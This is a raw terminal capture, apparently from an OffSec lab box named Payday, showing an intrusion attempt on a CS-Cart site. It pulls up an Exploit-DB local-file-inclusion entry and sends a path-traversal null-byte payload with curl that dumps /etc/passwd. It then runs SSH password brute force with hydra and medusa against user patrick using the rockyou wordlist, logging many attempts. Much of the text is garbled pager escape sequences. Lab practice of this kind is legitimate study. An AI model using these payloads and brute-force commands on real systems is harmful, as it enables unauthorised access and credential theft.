[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KO
+$ [10:29:02] cat php/webapps/48890.txt
+
+$ [10:29:14] cat ~/php/webapps/48890.txt
+
+$ [10:29:41] searchsploit -x php/webapps/48890.txt
+O[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K [KESCESC[KOO[KAA[K[K[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t
+
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:28:31][39m $ [K[?1h=[?2004hc[1m[31mc[0m[39m[1m[31mc[1m[31ma[0m[39m[1m[31mc[1m[31ma[1m[31mt[0m[39m[0m[32mc[0m[32ma[0m[32mt[39m[32mt[32m [39m[32mt[39m[39m php/webapps/48890.txt[?1l>[?2004l
+cat: php/webapps/48890.txt: No such file or directory
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:29:02][39m $ [K[?1h=[?2004hcat php/webapps/48890.txt[25D[32mc[32ma[32mt[39m[22C~php/webapps/48890.txt[21D/php/webapps/48890.txt[21D[?1l>[?2004l
+cat: /home/kali/php/webapps/48890.txt: No such file or directory
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:29:14][39m $ [K[?1h=[?2004hcat ~/php/webapps/48890.txt[27D[32mc[32ma[32mt[39m[24C[23D[P[P[21C  [25D[32ms[32me[32ma[39mrchsploit -x php/webapps/48890.txt[35D[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[25C[?1l>[?2004l
+  Exploit: CS-Cart 1.3.3 - 'classes_dir' LFI
+      URL: https://www.exploit-db.com/exploits/48890
+     Path: /usr/share/exploitdb/exploits/php/webapps/48890.txt
+    Codes: N/A
+ Verified: False
+File Type: ASCII text
+[?1049h[22;0;0t[53;1H[?1h=# Exploit Title: CS-Cart unauthenticated LFI
+# Date: 2020-09-22
+# Exploit Author:  0xmmnbassel
+# Vendor Homepage: https://www.cs-cart.com/e-commerce-platform.html
+# Tested at: ver. 1.3.4
+# Vulnerability Type: unauthenticated LFI
+
+
+http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=[evil_scripts]%00
+example:
+http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
+http://www.site.com/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
+[7m/usr/share/exploitdb/exploits/php/webapps/48890.txt (END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t
+
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:50:58][39m $ [K[?1h=[?2004hcurl "http://$BoxIP/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../..
+$ [10:51:07] curl "http://$BoxIP/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00"
+
+$ [10:56:39] hydra -l patrick -P /usr/share/wordlists/rockyou.txt ssh://$BoxIP -t 4
+/../../../../../../etc/passwd%00"[120D[32mc[32mu[32mr[32ml[39m [33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mc[33ml[33ma[33ms[33ms[33me[33ms[33m/[33mp[33mh[33mp[33mm[33ma[33mi[33ml[33me[33mr[33m/[33mc[33ml[33ma[33ms[33ms[33m.[33mc[33ms[33m_[33mp[33mh[33mp[33mm[33ma[33mi[33ml[33me[33mr[33m.[33mp[33mh[33mp[33m?[33mc[33ml[33ma[33ms[33ms[33me[33ms[33m_[33md[33mi[33mr[33m=[33m.[33m.[33m/[33m.[33m.[33m/[33m.[33m.[33m/[33m.[33m.[33m/[33m.[33m.[33m/[33m.[33m.[33m/[33m.[33m.[33m/[33m.[33m.[33m/[33m.[33m.[33m/[33m.[33m.[33m/[33m.[33m.[33m/[33me[33mt[33mc[33m/[33mp[33ma[33ms[33ms[33mw[33md[33m%[33m0[33m0[33m"[39m[?1l>[?2004l
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+dhcp:x:100:101::/nonexistent:/bin/false
+syslog:x:101:102::/home/syslog:/bin/false
+klog:x:102:103::/home/klog:/bin/false
+mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
+dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+postfix:x:105:112::/var/spool/postfix:/bin/false
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
+<br />
+<b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:51:07][39m $ [K[?1h=[?2004hhydra -l patrick -P /usr/share/wordlists/rockyou.txt ssh://$BoxIP -t 4[70D[32mh[32my[32md[32mr[32ma[39m[15C[4m/[4mu[4ms[4mr[4m/[4ms[4mh[4ma[4mr[4me[4m/[4mw[4mo[4mr[4md[4ml[4mi[4ms[4mt[4ms[4m/[4mr[4mo[4mc[4mk[4my[4mo[4mu[4m.[4mt[4mx[4mt[24m[18C[?1l>[?2004l
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-25 10:56:39
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://192.168.119.39:22/
+[ERROR] could not connect to ssh://192.168.119.39:22 - kex error : no match for method mac algo client->server: server [hmac-md5,hmac-sha1,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96], client [hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512]
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:56:41][39m $ [K[?1h=[?2004hmedusa -h $BoxIP -u patrick -P /usr/share/wordlists/rockyou.txt -M ssh -t 4[75D[32mm[32me[32md[32mu[32ms[32ma[39m[25C[4m/[4mu[4ms[4mr[4m/[4ms[4mh[4ma[4mr[4me[4m/[4mw[4mo[4mr[4md[4ml[4
+$ [10:57:43] medusa -h $BoxIP -u patrick -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
+mi[4ms[4mt[4ms[4m/[4mr[4mo[4mc[4mk[4my[4mo[4mu[4m.[4mt[4mx[4mt[24m[12C[?1l>[?2004l
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-08-25 10:57:46 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 123456 (1 of 14344391 complete)
+2026-08-25 10:57:46 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 123456789 (2 of 14344391 complete)
+2026-08-25 10:57:46 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: password (3 of 14344391 complete)
+2026-08-25 10:57:46 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 12345 (4 of 14344391 complete)
+2026-08-25 10:57:49 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: iloveyou (5 of 14344391 complete)
+2026-08-25 10:57:49 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: princess (6 of 14344391 complete)
+2026-08-25 10:57:49 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 1234567 (7 of 14344391 complete)
+2026-08-25 10:57:49 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: rockyou (8 of 14344391 complete)
+2026-08-25 10:57:50 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 12345678 (9 of 14344391 complete)
+2026-08-25 10:57:50 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: abc123 (10 of 14344391 complete)
+2026-08-25 10:57:50 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: nicole (11 of 14344391 complete)
+2026-08-25 10:57:50 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: daniel (12 of 14344391 complete)
+2026-08-25 10:57:52 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: babygirl (13 of 14344391 complete)
+2026-08-25 10:57:52 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: monkey (14 of 14344391 complete)
+2026-08-25 10:57:52 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: lovely (15 of 14344391 complete)
+2026-08-25 10:57:52 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jessica (16 of 14344391 complete)
+2026-08-25 10:57:55 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 654321 (17 of 14344391 complete)
+2026-08-25 10:57:55 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: michael (18 of 14344391 complete)
+2026-08-25 10:57:55 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: qwerty (19 of 14344391 complete)
+2026-08-25 10:57:55 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: ashley (20 of 14344391 complete)
+2026-08-25 10:57:57 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 111111 (21 of 14344391 complete)
+2026-08-25 10:57:57 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: iloveu (22 of 14344391 complete)
+2026-08-25 10:57:57 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 000000 (23 of 14344391 complete)
+2026-08-25 10:57:57 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: michelle (24 of 14344391 complete)
+2026-08-25 10:57:59 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: tigger (25 of 14344391 complete)
+2026-08-25 10:57:59 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: chocolate (26 of 14344391 complete)
+2026-08-25 10:57:59 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: password1 (27 of 14344391 complete)
+2026-08-25 10:57:59 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: sunshine (28 of 14344391 complete)
+2026-08-25 10:58:01 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: soccer (29 of 14344391 complete)
+2026-08-25 10:58:01 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: butterfly (30 of 14344391 complete)
+2026-08-25 10:58:01 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: anthony (31 of 14344391 complete)
+2026-08-25 10:58:01 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: friends (32 of 14344391 complete)
+2026-08-25 10:58:03 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: angel (33 of 14344391 complete)
+2026-08-25 10:58:03 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jordan (34 of 14344391 complete)
+2026-08-25 10:58:03 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: purple (35 of 14344391 complete)
+2026-08-25 10:58:03 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: liverpool (36 of 14344391 complete)
+2026-08-25 10:58:05 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: justin (37 of 14344391 complete)
+2026-08-25 10:58:05 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: loveme (38 of 14344391 complete)
+2026-08-25 10:58:05 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: fuckyou (39 of 14344391 complete)
+2026-08-25 10:58:05 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 123123 (40 of 14344391 complete)
+2026-08-25 10:58:07 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: football (41 of 14344391 complete)
+2026-08-25 10:58:07 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: secret (42 of 14344391 complete)
+2026-08-25 10:58:07 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: andrea (43 of 14344391 complete)
+2026-08-25 10:58:07 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: carlos (44 of 14344391 complete)
+2026-08-25 10:58:09 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jennifer (45 of 14344391 complete)
